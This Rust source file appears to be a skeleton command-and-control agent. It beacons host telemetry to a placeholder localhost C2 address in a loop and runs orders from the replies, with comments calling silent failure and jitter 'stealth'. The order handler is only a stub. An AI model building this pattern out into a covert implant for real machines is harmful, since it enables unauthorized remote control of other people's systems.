use std::{thread, time::Duration};
use std::process::Command;
use sysinfo::{CpuExt, System, SystemExt};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Serialize, Deserialize, Debug)]
struct BeaconPayload {
    agent_id: String,
    hostname: String,
    os: String,
    cpu_usage: f32,
    ram_usage: u64,
    status: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandResponse {
    command: String,
    args: Option<String>,
}

const HQ_URL: &str = "http://localhost:8080/api/beacon"; // Placeholder C2

#[tokio::main]
async fn main() {
    println!(">> OSI FIELD AGENT v1.0 INITIALIZING <<");
    
    // 1. Identity
    let agent_id = Uuid::new_v4().to_string();
    let hostname = hostname::get().unwrap_or_default().to_string_lossy().to_string();
    let detected_os = std::env::consts::OS.to_string();
    
    println!("Identity: {} @ {}", agent_id, hostname);
    
    let mut sys = System::new_all();
    let client = reqwest::Client::new();

    // 2. Main Loop
    loop {
        sys.refresh_all();
        
        // Gather Telemetry
        let cpu = sys.global_cpu_info().cpu_usage();
        let ram = sys.used_memory();
        
        let payload = BeaconPayload {
            agent_id: agent_id.clone(),
            hostname: hostname.clone(),
            os: detected_os.clone(),
            cpu_usage: cpu,
            ram_usage: ram,
            status: "ACTIVE".to_string(),
        };

        // Beacon to C2
        // In simulation mode, we just print unless we have a real server
        // println!("[*] Beaming stats to HQ: CPU {:.1}% | RAM {} MB", cpu, ram / 1024 / 1024);

        match client.post(HQ_URL).json(&payload).send().await {
            Ok(resp) => {
                if let Ok(cmd) = resp.json::<CommandResponse>().await {
                    println!("[+] Received Order: {}", cmd.command);
                    execute_order(&cmd.command);
                }
            },
            Err(_) => {
                // Silent fail (Stealth)
                // println!("[-] HQ Unreachable. Retrying...");
            }
        }

        // Variable Jitter (Stealth)
        thread::sleep(Duration::from_secs(5));
    }
}

fn execute_order(cmd: &str) {
    if cmd == "scan_network" {
        println!("Executing Nmap...");
        // Command::new("nmap")...
    } else if cmd == "self_destruct" {
        std::process::exit(0);
    }
}
